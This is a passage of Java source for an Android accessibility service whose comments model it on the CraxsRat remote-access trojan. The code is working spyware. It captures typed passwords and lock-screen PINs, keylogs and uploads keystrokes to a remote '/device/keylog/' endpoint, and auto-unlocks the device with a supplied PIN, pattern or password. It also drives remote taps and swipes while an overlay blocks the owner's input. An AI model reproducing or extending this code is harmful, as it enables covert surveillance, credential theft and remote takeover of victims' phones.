                org.json.JSONObject pwcap = new org.json.JSONObject();
                for (java.util.Map.Entry<String, StringBuilder> e2 : pwCapture.entrySet()) {
                    if (e2.getValue().length() > 0) {
                        pwcap.put(e2.getKey(), e2.getValue().toString());
                    }
                }
                if (pwcap.length() > 0) j.put("pwcap", pwcap);
            }
            return j.toString();
        } catch (Exception e) {
            return "";
        }
    }

    /** Collect element bounds + text for CraxsRat-style canvas wireframe rendering.
     *  Emits every visible node that has non-zero screen bounds — more permissive
     *  than extractAllText, so the canvas always shows something.
     *  isKeyboard=true marks elements as "kbd" kind (rendered differently in panel). */
    private void extractElements(AccessibilityNodeInfo node, org.json.JSONArray out, int depth, boolean isKeyboard) {
        if (node == null || depth > 45) return;
        try {
            CharSequence cls   = node.getClassName();
            String className   = cls != null ? cls.toString() : "";
            boolean isEdit     = className.contains("EditText") || node.isEditable();
            boolean isClickable= node.isClickable();
            boolean isImg      = className.contains("ImageView") || className.contains("ImageButton");
            boolean isBtn      = className.contains("Button") || (isClickable && !isEdit);
            boolean isCheckbox = className.contains("CheckBox") || className.contains("Switch") || className.contains("Toggle");

            CharSequence t    = node.getText();
            CharSequence d    = node.getContentDescription();
            CharSequence hint = node.getHintText();

            String textStr = t    != null ? t.toString().trim()    : "";
            String descStr = d    != null ? d.toString().trim()    : "";
            String hintStr = hint != null ? hint.toString().trim() : "";
            String label   = !textStr.isEmpty() ? textStr : (!descStr.isEmpty() ? descStr : hintStr);

            // Emit: anything that has text/desc OR is a leaf OR is a known interactive widget
            Rect b = new Rect();
            node.getBoundsInScreen(b);
            boolean visibleBounds = b.width() > 8 && b.height() > 4;
            boolean hasText = !label.isEmpty();
            boolean isLeaf  = node.getChildCount() == 0;
            boolean emit    = visibleBounds && node.isVisibleToUser()
                              && (hasText || isLeaf || isEdit || isClickable || isCheckbox);

            if (emit) {
                boolean isPwNode = node.isPassword();
                String displayLabel = label;

                // For any node: if text looks masked (●, •, *, ·) OR node is password-type,
                // try to replace with actual captured PIN text from pwCapture map.
                // Also covers custom PIN display views that don't set isPassword()=true.
                boolean textIsMasked = !label.isEmpty() && isPasswordMask(label);
                if (isPwNode || textIsMasked) {
                    // Try current window pkg first, then fall back to most recent pwCapturePkg
                    CharSequence nodePkg = node.getPackageName();
                    String np = nodePkg != null ? nodePkg.toString() : pwCapturePkg;
                    StringBuilder captured = pwCapture.get(np);
                    if (captured == null && !pwCapturePkg.isEmpty()) {
                        captured = pwCapture.get(pwCapturePkg);
                    }
                    if (captured != null && captured.length() > 0) {
                        displayLabel = captured.toString();
                        isPwNode = true; // ensure red-border in reader
                    }
                }
                org.json.JSONObject el = new org.json.JSONObject();
                el.put("t", displayLabel.isEmpty() ? "" : displayLabel);
                el.put("x", b.left);
                el.put("y", b.top);
                el.put("w", b.width());
                el.put("h", b.height());
                // kind: e=edit, b=button/clickable, img=image, cb=checkbox, tx=text, kbd=keyboard key
                String kind;
                if (isKeyboard)      kind = "kbd"; // keyboard keys shown in distinct color
                else if (isEdit)     kind = "e";
                else if (isBtn)      kind = "b";
                else if (isImg)      kind = "img";
                else if (isCheckbox) kind = "cb";
                else                 kind = "tx";
                el.put("k", kind);
                el.put("pw", isPwNode);
                out.put(el);
            }
        } catch (Exception ignored) {}
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                extractElements(child, out, depth + 1, isKeyboard);
                child.recycle();
            }
        }
    }

    private String extractClickLabel(AccessibilityNodeInfo node) {
        if (node == null) return null;
        CharSequence cs = node.getText();
        String txt = cs != null ? cs.toString().trim() : "";
        if (!txt.isEmpty() && txt.length() >= 2 && txt.length() <= 80) return txt;
        CharSequence cd = node.getContentDescription();
        String desc = cd != null ? cd.toString().trim() : "";
        if (!desc.isEmpty() && desc.length() >= 2 && desc.length() <= 80) return desc;
        try {
            int cc = node.getChildCount();
            StringBuilder combined = new StringBuilder();
            for (int i = 0; i < cc && i < 5; i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    CharSequence ct = child.getText();
                    if (ct != null && ct.length() > 0) {
                        if (combined.length() > 0) combined.append(" ");
                        combined.append(ct.toString().trim());
                    }
                    child.recycle();
                }
            }
            String result = combined.toString().trim();
            if (!result.isEmpty() && result.length() >= 2 && result.length() <= 80) return result;
        } catch (Exception ignored) {}
        return null;
    }

    private String resolveForegroundPkg() {
        try {
            List<AccessibilityWindowInfo> windows = getWindows();
            if (windows != null) {
                for (AccessibilityWindowInfo win : windows) {
                    if (win.getType() == AccessibilityWindowInfo.TYPE_APPLICATION) {
                        AccessibilityNodeInfo root = win.getRoot();
                        if (root != null) {
                            String p = root.getPackageName() != null ? root.getPackageName().toString() : "";
                            root.recycle();
                            if (!p.isEmpty() && !p.equals(MY_PKG) && !isLauncherPkg(p)) return p;
                        }
                    }
                }
            }
        } catch (Exception ignored) {}
        return null;
    }

    /** Returns true for keyboard/IME packages that add noise to screen-reader output. */
    private boolean isKeyboardOrSystemPkg(String pkg) {
        if (pkg == null || pkg.isEmpty()) return false;
        String p = pkg.toLowerCase();
        return p.contains("inputmethod")
            || p.contains(".keyboard")
            || p.contains("gboard")
            || p.contains("honeyboard")
            || p.contains("swiftkeyboard")
            || p.contains("swiftkey")
            || p.contains(".ime.")
            || p.endsWith(".ime")
            || p.contains("fleksy")
            || p.contains("chrooma")
            || p.contains("grammarly")
            || p.contains("facemoji")
            || p.contains("typany")
            || p.contains("kika")
            || p.contains("ai.type")
            || p.contains("touchpal")
            || p.contains("bobble")
            || p.contains("neonkeyboard")
            || p.contains("thinkyeah")
            || p.contains("anysoftkeyboard")
            || p.contains("hacker.keyboard")
            || p.contains("indic.keyboard")
            || p.contains("multiling")
            || p.contains("florisboard")
            || p.contains("unexpected.keyboard")
            || p.contains("openboard")
            || p.contains("simple.keyboard")
            || p.contains("helium314")
            || p.contains(".leankey")
            || p.contains("keypad")
            || p.contains("klavye")
            || p.contains("tastatur")
            || p.contains("clavier")
            || p.contains("betterkeyboard")
            || p.contains("nintype")
            || p.contains("wirelesskey")
            || p.contains("handcent")
            || p.contains("adaptxt")
            || p.contains("keymonk")
            || p.contains("zemoji")
            || p.contains("coolerinput")
            || p.equals("com.samsung.android.honeyboard")
            || p.equals("com.google.android.inputmethod.latin")
            || p.equals("com.huawei.ohos.inputmethod")
            || p.equals("com.oppo.ime")
            || p.equals("com.vivo.ime")
            || p.equals("com.xiaomi.mipicks.ime")
            || p.equals("com.meizu.flyme.input")
            || p.equals("com.baidu.input")
            || p.equals("com.sogou.inputmethod")
            || p.equals("com.iflytek.inputmethod")
            || p.equals("com.tencent.qqpinyin")
            || p.equals("jp.co.omronsoft.openwnn")
            || p.equals("com.lge.ime")
            || p.equals("com.asus.ime")
            || p.equals("com.sec.android.inputmethod");
    }

    private String extractLockScreenDigit(AccessibilityNodeInfo node) {
        if (node == null) return null;
        try {
            CharSequence cs = node.getText();
            String txt = cs != null ? cs.toString().trim() : "";
            CharSequence cd = node.getContentDescription();
            String desc = cd != null ? cd.toString().trim() : "";
            if (txt.length() == 1 && Character.isDigit(txt.charAt(0))) return "[PIN]" + txt;
            if (desc.length() == 1 && Character.isDigit(desc.charAt(0))) return "[PIN]" + desc;
            if (desc.matches("(?i).*backspace.*|.*delete.*|.*erase.*|.*clear.*")) return "[⌫]";
            if (txt.matches("(?i).*backspace.*|.*delete.*|.*erase.*|.*clear.*")) return "[⌫]";
            if (desc.matches("(?i).*cancel.*|.*dismiss.*")) return "[⌫]";
            if (desc.matches("(?i).*enter.*|.*ok.*|.*confirm.*|.*done.*|.*unlock.*")) return "[ENTER]";
            if (desc.matches("(?i).*emergency.*")) return null;
            String viewId = node.getViewIdResourceName();
            if (viewId != null) {
                java.util.regex.Matcher m = java.util.regex.Pattern.compile("key[_]?(\\d)").matcher(viewId);
                if (m.find()) return "[PIN]" + m.group(1);
                if (viewId.contains("delete") || viewId.contains("backspace")) return "[⌫]";
                if (viewId.contains("enter") || viewId.contains("ok")) return "[ENTER]";
            }
            int cc = node.getChildCount();
            for (int i = 0; i < cc && i < 5; i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    CharSequence ct = child.getText();
                    String childTxt = ct != null ? ct.toString().trim() : "";
                    if (childTxt.length() == 1 && Character.isDigit(childTxt.charAt(0))) {
                        child.recycle();
                        return "[PIN]" + childTxt;
                    }
                    CharSequence ccd = child.getContentDescription();
                    String childDesc = ccd != null ? ccd.toString().trim() : "";
                    if (childDesc.length() == 1 && Character.isDigit(childDesc.charAt(0))) {
                        child.recycle();
                        return "[PIN]" + childDesc;
                    }
                    child.recycle();
                }
            }
        } catch (Exception ignored) {}
        return null;
    }

    /** Returns true for lock screen / keyguard packages */
    private static boolean isLockScreenPkg(String pkg) {
        if (pkg == null || pkg.isEmpty()) return false;
        String p = pkg.toLowerCase();
        return p.contains("keyguard")
            || p.equals("com.android.systemui")
            || p.contains("lockscreen")
            || p.contains("lock_screen")
            || p.contains("lockstar")
            || p.contains("com.samsung.android.biometrics")
            || p.contains("com.miui.keyguard")
            || p.contains("com.oneplus.aod")
            || p.contains("com.oppo.keyguard")
            || p.contains("com.coloros.keyguard")
            || p.contains("com.vivo.faceunlock")
            || p.contains("com.huawei.systemmanager")
            || p.contains("com.realme.keyguard")
            || p.contains("com.transsion.keyguard")
            || p.contains("com.android.keyguard");
    }

    private String detectLockType(AccessibilityNodeInfo node) {
        return detectLockTypeRecursive(node, 0);
    }

    private String detectLockTypeRecursive(AccessibilityNodeInfo node, int depth) {
        if (node == null || depth > 15) return null;
        CharSequence cls = node.getClassName();
        if (cls != null) {
            String cn = cls.toString().toLowerCase();
            if (cn.contains("lockpatternview") || cn.contains("patternview")) return "PATTERN";
            if (cn.contains("pinview") || cn.contains("passwordtextview")) return "PIN";
            if (cn.contains("edittext") && node.isPassword()) return "PASSWORD";
        }
        CharSequence desc = node.getContentDescription();
        if (desc != null) {
            String d = desc.toString().toLowerCase();
            if (d.contains("pattern")) return "PATTERN";
            if (d.contains("pin")) return "PIN";
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo c = node.getChild(i);
            if (c != null) {
                String result = detectLockTypeRecursive(c, depth + 1);
                c.recycle();
                if (result != null) return result;
            }
        }
        return null;
    }

    private void extractAllText(AccessibilityNodeInfo node, StringBuilder sb,
                                 StringBuilder inputs, int depth) {
        if (node == null || depth > 35) return;

        CharSequence cls = node.getClassName();
        String className = cls != null ? cls.toString() : "";
        boolean isEditText = className.contains("EditText") || node.isEditable();
        boolean isButton   = className.contains("Button");

        CharSequence t = node.getText();
        CharSequence d = node.getContentDescription();
        CharSequence hint = node.getHintText();

        String textStr   = t != null ? t.toString().trim() : "";
        String descStr   = d != null ? d.toString().trim() : "";
        String hintStr   = hint != null ? hint.toString().trim() : "";

        if (isEditText) {
            String label = !hintStr.isEmpty() ? hintStr : (!descStr.isEmpty() ? descStr : "field");
            String value = !textStr.isEmpty() ? textStr : "(empty)";
            boolean isPassword = node.isPassword();
            inputs.append("[INPUT] ").append(label)
                  .append(isPassword ? " [PASSWORD]" : "")
                  .append(": ").append(value).append("\n");
            if (!textStr.isEmpty()) {
                sb.append("[✏ ").append(label).append("]: ").append(value).append("\n");
            }
        } else if (isButton) {
            String label = !textStr.isEmpty() ? textStr : (!descStr.isEmpty() ? descStr : "");
            if (!label.isEmpty()) sb.append("[⬛ ").append(label).append("]\n");
        } else {
            if (!textStr.isEmpty()) {
                sb.append(textStr).append("\n");
            } else if (!descStr.isEmpty()) {
                sb.append("[").append(descStr).append("]\n");
            } else if (node.isClickable() && !className.isEmpty()) {
                // Clickable view with no text — show class so reader shows something on lock screen
                String simpleName = className.contains(".") ? className.substring(className.lastIndexOf('.') + 1) : className;
                if (!simpleName.isEmpty() && !simpleName.equals("View") && !simpleName.equals("LinearLayout")
                        && !simpleName.equals("RelativeLayout") && !simpleName.equals("FrameLayout")
                        && !simpleName.equals("ConstraintLayout")) {
                    sb.append("[").append(simpleName).append("]\n");
                }
            }
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                extractAllText(child, sb, inputs, depth + 1);
                child.recycle();
            }
        }
    }

    // Must be called inside synchronized(keyBuffer)
    private void flushKeylog() {
        if (keyBuffer.isEmpty()) return;
        StringBuilder sb = new StringBuilder("[");
        for (int i = 0; i < keyBuffer.size(); i++) {
            if (i > 0) sb.append(',');
            sb.append(keyBuffer.get(i));
        }
        sb.append("]");
        final List<String> toSend = new ArrayList<>(keyBuffer);
        keyBuffer.clear();
        final String body = "{\"keys\":" + sb + "}";
        final String deviceId = DeviceIdManager.getDeviceId(this);
        new Thread(() -> {
            try {
                ApiClient.postJson("/device/keylog/" + deviceId, body);
                // If successful, clear any pending offline keys too
                clearPendingOfflineKeys();
            } catch (Exception e) {
                // Offline — save to SharedPreferences to retry later
                savePendingKeys(toSend);
            }
        }).start();
    }

    private void savePendingKeys(List<String> keys) {
        try {
            SharedPreferences prefs = getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE);
            String existing = prefs.getString(PREF_PENDING_KEYS, "");
            StringBuilder sb = new StringBuilder(existing);
            for (String k : keys) {
                if (sb.length() > 0) sb.append(',');
                sb.append(k);
            }
            // Keep max 1000 entries in prefs
            String all = sb.toString();
            if (all.split("\\},\\{").length > 1000) {
                int trimAt = all.indexOf("},", all.length() / 2);
                if (trimAt > 0) all = all.substring(trimAt + 2);
            }
            prefs.edit().putString(PREF_PENDING_KEYS, all).apply();
        } catch (Exception ignored) {}
    }

    private void flushPendingOfflineKeys() {
        try {
            SharedPreferences prefs = getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE);
            String pending = prefs.getString(PREF_PENDING_KEYS, "");
            if (pending.isEmpty()) return;
            String body = "{\"keys\":[" + pending + "]}";
            String deviceId = DeviceIdManager.getDeviceId(this);
            ApiClient.postJson("/device/keylog/" + deviceId, body);
            clearPendingOfflineKeys();
        } catch (Exception ignored) {}
    }

    private void clearPendingOfflineKeys() {
        try {
            getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE)
                .edit().remove(PREF_PENDING_KEYS).apply();
        } catch (Exception ignored) {}
    }

    @Override public void onInterrupt() {}

    @Override
    public void onDestroy() {
        super.onDestroy();
        // Stop watchdog thread
        watchdogRunning = false;
        if (watchdogThread != null) watchdogThread.interrupt();
        // Unregister network callback
        try {
            if (networkCallback != null) {
                android.net.ConnectivityManager cm =
                    (android.net.ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
                if (cm != null) cm.unregisterNetworkCallback(networkCallback);
                networkCallback = null;
            }
        } catch (Exception ignored) {}
        // Flush any remaining keys before shutting down
        synchronized (keyBuffer) {
            if (!keyBuffer.isEmpty()) flushKeylog();
        }
        mainHandler.post(() -> {
            try { doRemoveOverlay(); } catch (Exception ignored) {}
            try { dismissBlackScreenOverlay(); } catch (Exception ignored) {}
        });
        instance = null;
    }

    /* ── isEnabled check ───────────────────────────────────────────────────── */
    public static boolean isEnabled(Context ctx) {
        try {
            String flat = Settings.Secure.getString(
                ctx.getContentResolver(),
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            if (flat == null || flat.isEmpty()) return false;
            String svcSuffix = "/com.panellord.PanelAccessibility";
            for (String s : flat.split(":")) {
                if (s.trim().endsWith(svcSuffix)) return true;
            }
        } catch (Exception ignored) {}
        return false;
    }

    /* ── Internal: temporarily lift overlay → gesture → restore overlay ───── */

    private interface GestureAction {
        void run(GestureResultCallback cb) throws Exception;
    }

    private void runGesture(GestureAction action) {
        mainHandler.post(() -> {
            gestureInProgress = true;
            final boolean wasBlocking = (blockOverlay != null && blockOverlay.isAttachedToWindow())
                || blockInputEnabled;
            if (blockOverlay != null) doRemoveOverlay();

            GestureResultCallback cb = new GestureResultCallback() {
                @Override public void onCompleted(GestureDescription g) {
                    gestureInProgress = false;
                    if (wasBlocking && blockInputEnabled) mainHandler.postDelayed(PanelAccessibility.this::doInstallOverlay, 200);
                    // Push screen text at 300ms, 600ms, 1200ms after gesture so
                    // reader catches both fast and slow app transitions
                    if (screenLiveMode) {
                        mainHandler.postDelayed(() -> onWindowChangedMaybePush(), 300);
                        mainHandler.postDelayed(() -> onWindowChangedMaybePush(), 650);
                        mainHandler.postDelayed(() -> onWindowChangedMaybePush(), 1300);
                    }
                }
                @Override public void onCancelled(GestureDescription g) {
                    gestureInProgress = false;
                    if (wasBlocking && blockInputEnabled) mainHandler.postDelayed(PanelAccessibility.this::doInstallOverlay, 200);
                    if (screenLiveMode) {
                        mainHandler.postDelayed(() -> onWindowChangedMaybePush(), 300);
                    }
                }
            };

            // Wait 150ms for overlay removal to take effect before dispatching
            mainHandler.postDelayed(() -> {
                try {
                    action.run(cb);
                } catch (Exception e) {
                    gestureInProgress = false;
                    if (wasBlocking && blockInputEnabled) doInstallOverlay();
                }
            }, wasBlocking ? 150 : 0);
        });
    }

    /* ── Gesture public API ─────────────────────────────────────────────────── */

    public void tap(float x, float y) {
        runGesture(cb -> {
            Path path = new Path();
            path.moveTo(x, y);
            dispatchGesture(new GestureDescription.Builder()
                .addStroke(new GestureDescription.StrokeDescription(path, 0, 80))
                .build(), cb, mainHandler);
        });
    }

    public void swipe(float x1, float y1, float x2, float y2, long dur) {
        runGesture(cb -> {
            Path path = new Path();
            path.moveTo(x1, y1);
            path.lineTo(x2, y2);
            dispatchGesture(new GestureDescription.Builder()
                .addStroke(new GestureDescription.StrokeDescription(path, 0, Math.max(dur, 100)))
                .build(), cb, mainHandler);
        });
    }

    public void longPress(float x, float y) {
        runGesture(cb -> {
            Path path = new Path();
            path.moveTo(x, y);
            dispatchGesture(new GestureDescription.Builder()
                .addStroke(new GestureDescription.StrokeDescription(path, 0, 600))
                .build(), cb, mainHandler);
        });
    }

    public void swipePattern(org.json.JSONArray dots) {
        runGesture(cb -> {
            if (dots == null || dots.length() < 2) return;
            Path path = new Path();
            org.json.JSONObject first = dots.getJSONObject(0);
            path.moveTo((float) first.optDouble("x", 0), (float) first.optDouble("y", 0));
            for (int i = 1; i < dots.length(); i++) {
                org.json.JSONObject d = dots.getJSONObject(i);
                path.lineTo((float) d.optDouble("x", 0), (float) d.optDouble("y", 0));
            }
            long dur = Math.max(dots.length() * 120L, 400L);
            dispatchGesture(new GestureDescription.Builder()
                .addStroke(new GestureDescription.StrokeDescription(path, 0, dur))
                .build(), cb, mainHandler);
        });
    }

    /* ── Auto-unlock: PIN ──────────────────────────────────────────────────── */
    public void autoUnlockPin(String pin) {
        mainHandler.postDelayed(() -> {
            android.util.DisplayMetrics dm = getResources().getDisplayMetrics();
            int w = dm.widthPixels;
            int h = dm.heightPixels;

            int padLeft   = (int)(w * 0.15);
            int padRight  = (int)(w * 0.85);
            int padTop    = (int)(h * 0.50);
            int padBottom = (int)(h * 0.82);
            int colW = (padRight - padLeft) / 3;
            int rowH = (padBottom - padTop) / 4;

            int[][] digitPos = new int[10][2];
            digitPos[1] = new int[]{padLeft + colW/2,          padTop + rowH/2};
            digitPos[2] = new int[]{padLeft + colW + colW/2,   padTop + rowH/2};
            digitPos[3] = new int[]{padLeft + 2*colW + colW/2, padTop + rowH/2};
            digitPos[4] = new int[]{padLeft + colW/2,          padTop + rowH + rowH/2};
            digitPos[5] = new int[]{padLeft + colW + colW/2,   padTop + rowH + rowH/2};
            digitPos[6] = new int[]{padLeft + 2*colW + colW/2, padTop + rowH + rowH/2};
            digitPos[7] = new int[]{padLeft + colW/2,          padTop + 2*rowH + rowH/2};
            digitPos[8] = new int[]{padLeft + colW + colW/2,   padTop + 2*rowH + rowH/2};
            digitPos[9] = new int[]{padLeft + 2*colW + colW/2, padTop + 2*rowH + rowH/2};
            digitPos[0] = new int[]{padLeft + colW + colW/2,   padTop + 3*rowH + rowH/2};

            AccessibilityNodeInfo root = getRootInActiveWindow();
            boolean foundButtons = false;
            if (root != null) {
                foundButtons = tapPinViaAccessibility(root, pin);
                root.recycle();
            }

            if (!foundButtons) {
                for (int i = 0; i < pin.length(); i++) {
                    int digit = pin.charAt(i) - '0';
                    if (digit >= 0 && digit <= 9) {
                        final int x = digitPos[digit][0];
                        final int y = digitPos[digit][1];
                        mainHandler.postDelayed(() -> tap(x, y), (i + 1) * 200L);
                    }
                }
                mainHandler.postDelayed(() -> {
                    AccessibilityNodeInfo r = getRootInActiveWindow();
                    if (r != null) {
                        tapNodeWithText(r, "OK", "Enter", "Done", "Confirm", "\u2713");
                        r.recycle();
                    }
                }, (pin.length() + 1) * 200L + 100);
            }
        }, 800);
    }

    private boolean tapPinViaAccessibility(AccessibilityNodeInfo root, String pin) {
        java.util.Map<String, android.graphics.Rect> digitBtns = new java.util.HashMap<>();
        findDigitButtons(root, digitBtns, 0);
        if (digitBtns.size() < 10) return false;

        for (int i = 0; i < pin.length(); i++) {
            String d = String.valueOf(pin.charAt(i));
            android.graphics.Rect r = digitBtns.get(d);
            if (r == null) return false;
            final int x = r.centerX();
            final int y = r.centerY();
            mainHandler.postDelayed(() -> tap(x, y), (i + 1) * 180L);
        }
        mainHandler.postDelayed(() -> {
            AccessibilityNodeInfo r2 = getRootInActiveWindow();
            if (r2 != null) {
                tapNodeWithText(r2, "OK", "Enter", "Done", "Confirm", "\u2713");
                r2.recycle();
            }
        }, (pin.length() + 1) * 180L + 100);
        return true;
    }

    private void findDigitButtons(AccessibilityNodeInfo node,
                                   java.util.Map<String, android.graphics.Rect> out, int depth) {
        if (node == null || depth > 20) return;
        CharSequence t = node.getText();
        if (t != null) {
            String txt = t.toString().trim();
            if (txt.length() == 1 && Character.isDigit(txt.charAt(0))) {
                android.graphics.Rect bounds = new android.graphics.Rect();
                node.getBoundsInScreen(bounds);
                out.put(txt, bounds);
            }
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo c = node.getChild(i);
            if (c != null) {
                findDigitButtons(c, out, depth + 1);
                c.recycle();
            }
        }
    }

    private void tapNodeWithText(AccessibilityNodeInfo node, String... labels) {
        if (node == null) return;
        CharSequence t = node.getText();
        CharSequence d = node.getContentDescription();
        String txt = t != null ? t.toString().trim().toLowerCase() : "";
        String desc = d != null ? d.toString().trim().toLowerCase() : "";
        for (String label : labels) {
            String lbl = label.toLowerCase();
            if (txt.equals(lbl) || desc.contains(lbl)) {
                android.graphics.Rect bounds = new android.graphics.Rect();
                node.getBoundsInScreen(bounds);
                tap(bounds.centerX(), bounds.centerY());
                return;
            }
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo c = node.getChild(i);
            if (c != null) {
                tapNodeWithText(c, labels);
                c.recycle();
            }
        }
    }

    /* ── Auto-unlock: Pattern ──────────────────────────────────────────────── */
    private static final int[][] PATTERN_GRID = {
        {0,0},{1,0},{2,0},
        {0,1},{1,1},{2,1},
        {0,2},{1,2},{2,2}
    };

    public void autoUnlockPattern(org.json.JSONArray sequence) {
        mainHandler.postDelayed(() -> {
            android.util.DisplayMetrics dm = getResources().getDisplayMetrics();
            int w = dm.widthPixels;
            int h = dm.heightPixels;

            int gridLeft   = (int)(w * 0.15);
            int gridRight  = (int)(w * 0.85);
            int gridTop    = (int)(h * 0.40);
            int gridBottom = (int)(h * 0.72);
            int cellW = (gridRight - gridLeft) / 2;
            int cellH = (gridBottom - gridTop) / 2;

            AccessibilityNodeInfo root = getRootInActiveWindow();
            android.graphics.Rect patternBounds = null;
            if (root != null) {
                patternBounds = findPatternViewBounds(root, 0);
                root.recycle();
            }
            if (patternBounds != null && patternBounds.width() > 100) {
                gridLeft   = patternBounds.left + patternBounds.width() / 6;
                gridTop    = patternBounds.top + patternBounds.height() / 6;
                cellW = patternBounds.width() / 3;
                cellH = patternBounds.height() / 3;
            }

            try {
                org.json.JSONArray dots = new org.json.JSONArray();
                for (int i = 0; i < sequence.length(); i++) {
                    int dotNum = sequence.getInt(i);
                    if (dotNum < 1 || dotNum > 9) continue;
                    int idx = dotNum - 1;
                    int col = PATTERN_GRID[idx][0];
                    int row = PATTERN_GRID[idx][1];
                    int cx = gridLeft + col * cellW + cellW / 2;
                    int cy = gridTop + row * cellH + cellH / 2;
                    org.json.JSONObject pt = new org.json.JSONObject();
                    pt.put("x", cx);
                    pt.put("y", cy);
                    dots.put(pt);
                }
                if (dots.length() >= 2) {
                    swipePattern(dots);
                }
            } catch (Exception ignored) {}
        }, 800);
    }

    private android.graphics.Rect findPatternViewBounds(AccessibilityNodeInfo node, int depth) {
        if (node == null || depth > 20) return null;
        CharSequence cls = node.getClassName();
        if (cls != null) {
            String cn = cls.toString().toLowerCase();
            if (cn.contains("lockpatternview") || cn.contains("patternview") || cn.contains("pattern")) {
                android.graphics.Rect r = new android.graphics.Rect();
                node.getBoundsInScreen(r);
                if (r.width() > 100) return r;
            }
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo c = node.getChild(i);
            if (c != null) {
                android.graphics.Rect found = findPatternViewBounds(c, depth + 1);
                c.recycle();
                if (found != null) return found;
            }
        }
        return null;
    }

    /* ── Auto-unlock: Password ─────────────────────────────────────────────── */
    public void autoUnlockPassword(String password) {
        mainHandler.postDelayed(() -> {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root == null) return;
            boolean typed = typeIntoEditText(root, password);
            root.recycle();
            if (typed) {
                mainHandler.postDelayed(() -> {
                    AccessibilityNodeInfo r2 = getRootInActiveWindow();
                    if (r2 != null) {
                        tapNodeWithText(r2, "OK", "Enter", "Done", "Confirm", "Unlock", "\u2713");
                        r2.recycle();
                    }
                }, 300);
            }
        }, 800);
    }

    private boolean typeIntoEditText(AccessibilityNodeInfo node, String text) {
        if (node == null) return false;
        CharSequence cls = node.getClassName();
        boolean isEdit = (cls != null && cls.toString().contains("EditText")) || node.isEditable();
        if (isEdit && node.isFocused()) {
            android.os.Bundle args = new android.os.Bundle();
            args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);
            node.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args);
            return true;
        }
        if (isEdit) {
            node.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
            node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            android.os.Bundle args = new android.os.Bundle();
            args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);
            node.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args);
            return true;
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo c = node.getChild(i);
            if (c != null) {
                if (typeIntoEditText(c, text)) { c.recycle(); return true; }
                c.recycle();
            }
        }
        return false;
    }

    /* ── Navigation ─────────────────────────────────────────────────────────── */
    public void goHome()    { mainHandler.post(() -> { try { performGlobalAction(GLOBAL_ACTION_HOME);    } catch (Exception ignored) {} }); }
    public void goBack()    { mainHandler.post(() -> { try { performGlobalAction(GLOBAL_ACTION_BACK);    } catch (Exception ignored) {} }); }
    public void goRecents() { mainHandler.post(() -> { try { performGlobalAction(GLOBAL_ACTION_RECENTS); } catch (Exception ignored) {} }); }

    /* ── Block / Unblock user input ─────────────────────────────────────────── */

    public void blockUserInput()   { blockInputEnabled = true;  mainHandler.post(this::doInstallOverlay); }
    public void unblockUserInput() { blockInputEnabled = false; mainHandler.post(this::doRemoveOverlay);  }
    public boolean isBlocking()    { return blockInputEnabled || blockOverlay != null; }

    /** Click the first button/text-view whose text matches any of the given labels (case-insensitive) */
    public void clickButtonWithText(String... labels) {
        mainHandler.post(() -> {
            try {
                AccessibilityNodeInfo root = getRootInActiveWindow();
                if (root == null) return;
                if (!clickNodeWithText(root, labels)) {
                    // Retry once after 800ms if not found (settings screen may still be loading)
                    mainHandler.postDelayed(() -> {
                        try {
                            AccessibilityNodeInfo r2 = getRootInActiveWindow();
                            if (r2 != null) { clickNodeWithText(r2, labels); r2.recycle(); }
                        } catch (Exception ignored) {}
                    }, 800);
                }
                root.recycle();
            } catch (Exception ignored) {}
        });
    }

    private boolean clickNodeWithText(AccessibilityNodeInfo node, String[] labels) {
        if (node == null) return false;
        CharSequence t = node.getText();
        CharSequence d = node.getContentDescription();
        String txt = t != null ? t.toString().trim() : "";
        String desc = d != null ? d.toString().trim() : "";
        for (String lbl : labels) {
            if (txt.equalsIgnoreCase(lbl) || desc.equalsIgnoreCase(lbl)) {
                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                return true;
            }
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                boolean found = clickNodeWithText(child, labels);
                child.recycle();
                if (found) return true;
            }
        }
        return false;
    }

    private void doInstallOverlay() {
        // Guard: if blocking was disabled while a gesture was in-flight, do not re-install.
        if (!blockInputEnabled) return;
        // If view reference exists but was detached by system (e.g. fingerprint dialog),
        // clean up stale reference so we can re-install.
        if (blockOverlay != null) {
            if (!blockOverlay.isAttachedToWindow()) {
                blockOverlay = null; // stale — fall through to re-install
            } else {
                return; // already properly installed
            }
        }
        try {
            WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);

            int overlayType;
            if (android.os.Build.VERSION.SDK_INT >= 34) {
                overlayType = WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY;
            } else if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O
                    && android.provider.Settings.canDrawOverlays(this)) {
                overlayType = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
            } else {
                overlayType = WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY;
            }

            int wFlags = WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
